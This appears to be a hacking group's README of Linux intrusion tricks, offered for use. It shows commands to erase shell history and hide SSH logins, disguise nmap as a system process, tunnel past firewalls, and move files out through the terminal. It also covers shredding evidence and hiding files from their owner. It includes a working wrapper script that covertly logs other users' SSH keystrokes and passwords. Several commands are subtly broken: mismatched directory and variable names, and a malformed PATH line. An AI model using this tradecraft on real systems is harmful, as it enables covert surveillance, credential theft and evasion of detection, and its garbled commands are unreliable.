# thc-1001-tips-and-tricks
Various tips &amp; tricks

A collection of our favorite tricks. Many of those tricks are not from us. We merely collect them.

We show the tricks 'as is' without any explanation why they work. You need to know Linux to understand how and why they work.

Got tricks? Send them to root@thc.org.


**1. Leave bash without history:**

Tell Bash that there is no history file (*~/.bash_history*).
```
$ unset HISTFILE
```
This is the first command we issue on our shell. 

It is good housekeeping to 'commit suicide' when exiting the shell:
```
$ kill -9 $$
```

**2. Almost invisilbe ssh**

```
$ ssh -o UserKnownHostsFile=/dev/null -T user@host.org "bash -i"
```
This will not add your user to the */var/log/utmp* file and you wont show up in *w* or *who* command of logged in users. On your client side it will stop logging the host name to *~/.ssh/known_hosts*.

**3. SSH tunnel OUT**

We use this all the time to circumvent local firewalls or IP filtering:
```
$ ssh -g -L31337:1.2.3.4:80 user@host.org
```
You or anyone else can now connect to your computer on port 31337 and gets connected to 1.2.3.4:80 and appearing from host 'host.org'

**4. SSH tunnel IN**

We use this to give access to a friend to an internal machine that is not on the public internet:
```
$ ssh -o ExitOnForwardFailure=yes -g -R31338:192.168.0.5:80 user@host.org
```
Anyone connecting to host.org:31338 will get connected to the compuyter 192.168.0.5 on port 80 via your computer.

**5. Hide your command**

```
$ cp `which nmap` syslogd
$ PATH=.:$PATH syslogd -T0 10.0.2.1/24
```
In this example we execute *nmap* but let it appear with the name *syslogd* in *ps alxwww* process list

**6. Hide your arguments**

Continuing from above..FIXME: can this be done witout LD_PRELOAD and just in bash?

**7. ARP discover computers on the local network**
```
$ nmap -r -sn -PR 192.168.0.1/24
```
This will Arp-ping all local machines. ARP ping always seems to work and is very steahlthy (e.g. does not show up in the target's firewall).

**8. Sniff a SSH session**
```
$ strace -p <PID of ssh> -e trace=read -o ~/.ssh/ssh_log.txt
$ grep 'read(4' ~/.ssh/ssh_log.txt | cut -f1 -d\"
```
Dirty way to monitor a user who is using ssh to connect to another host from a computer that you control.

**9. Sniff a SSH session without root priviledges**

Even dirtier way in case */proc/sys/kernel/yama/ptrace_scope* is set to 1 (strace will fail on already running SSH clients unless uid=0)

Create a wrapper script called 'ssh' that executes strace + ssh to log the session:
```
# Add ~/.ssh to the execution PATH variable so our 'ssh' is executed instead of the real ssh:
$ echo '$PATH=~/.local/bin:$PATH' >>~/.profile

# Create our log directory and our own ssh binary
$ mkdir ~/.ssh/.logs
$ mkdir -p ~/.local/bin ~/.ssh/logs

$ cat >~/.local/bin/ssh
#! /bin/bash
strace -e trace=read -o '! ~/.local/bin/ssh-log $$' /usr/bin/ssh $@
# now press CTRL-d to close the file.

$ cat ~/.local/bin/ssh-log
#! /bin/bash
grep 'read(4' | cut -f2 -d\" | while read -r x; do
        if [ ${#x} -ne 2 ] && [ ${#x} -ne 1 ]; then continue; fi
        if [ x"${x}" == "x\\n" ] || [ x"${x}" == "x\\r" ]; then
                echo ""
        else
                echo -n "${x}"
        fi
done >~/.ssh/.logs/ssh-log-"${1}"-`date +%s`.txt
# now press CTRL-d to close the file

$ chmod 755 ~/.local/bin/ssh ~/.local/bin/ssh-log
```

The SSH session will be sniffed and logged to *~/.ssh/logs/* the next time the user logs into his shell and uses SSH.

**10. File Encoding - uuencode**

Sometimes it is needed to encode a binary file to a more terminal friendly character-set such as base64. Any of these encoding techniques can be (see further on) to transfer a binary file between your local system and a remote system you are logged in to using nothing else but the shell/terminal as a transport medium (e.g. no separate connection).

Encode:
```
$ uuencode /etc/issue.net issuer.net-COPY
begin 644 issue-net-COPY
356)U;G1U(#$X+C`T+C(@3%13"@``
`
end
```
Cut & paste the output (4 lines, starting with 'being 644 ...') into this command:
Decode:
```
$ uudecode
begin 644 issue-net-COPY
356)U;G1U(#$X+C`T+C(@3%13"@``
`
end
```

**11. File Encoding - openssl**

Openssl can be used when uu/decode/encode is not available on the remote system:

Encode:
```
$ openssl base64 </etc/issue.net
VWJ1bnR1IDE4LjA0LjIgTFRTCg==
```
Cut & paste the output into this command:
```
$ openssl base64 -d >issue.net-COPY
```

**12. File Encoding - xxd**

..and if neither *uuencode* nor *openssl* is available then we have to dig a bit deeper in our trick box and use *xxd*.

Encode:
```
$ xxd -p </etc/issue.net
726f6f743a783a303a30...
```

Cut & paste the output into this command:
Decode:
```
$ xxd -p -r >issue.net-COPY
```

**13. File transfer - screen from REMOTE to LOCAL**

Transfer a file FROM the remote system to your local system:

Have a *screen* running on your local computer and log into the remote system from within your shell. Instruct your local screen to log all output:

> CTRL-a : logfile screen-xfer.txt

> CTRL-a H

We use *openssl* to encode our data but any of the above encoding methods works. This command will display the base64 encoded data in the terminal and *screen* will write this data to *screen-xfer.txt*:

```
$ openssl base64 </etc/issue.net
```

Stop your local screen from logging any further data:

> CTRL-a H 

On your local computer and from a different shell decode the file:
```
$ openssl base64 -d <screen-xfer.txt
$ rm -rf screen-xfer.txt
```

**13. File transfer - screen from LOCAL to REMOTE**

On your local system (from within a different shell) encode the data:
```
$ openssl base64 </etc/issue.net >screen-xfer.txt
```

On the remote system (and from within the current *screen*):
```
$ openssl base64 -d
```

Get *screen* to slurp the base64 encoded data into screen's clipboard and paste the data from the clipboard to the remote system:

> CTRL-a : readbuf screen-xfer.txt

> CTRL-a : paste .

> CTRL-d

> CTRL-d

Note: Two C-d are required due to a [bug in openssl](https://github.com/openssl/openssl/issues/9355).

**14. Shred & Erase a file**

```
$ shred -z foobar.txt
```

**15. Shred & Erase without *shred***
```
$ FNAME=foobar.txt; dd bs=1k count="`du -sk \"${FNAME}\" | cut -f1`" if=/dev/urandom >"${FILENAME}"; rm -f "${FNAME}"
```
Note: Or deploy your files in */dev/shm* directory so that no data is written to the harddrive. Data will be deleted on reboot.

Note: Or delete the file and then fill the entire harddrive with /dev/urandom and then rm -rf the dump file.

**16. Hide files as User from that User**

```
alias ls='ls -I SecretDirectory'
```

This will hide the directory *SecretDirectory* from the *ls* command. Place in user's *~/.profile*.


--------------------------------------------------------------------------
Shoutz: ADM


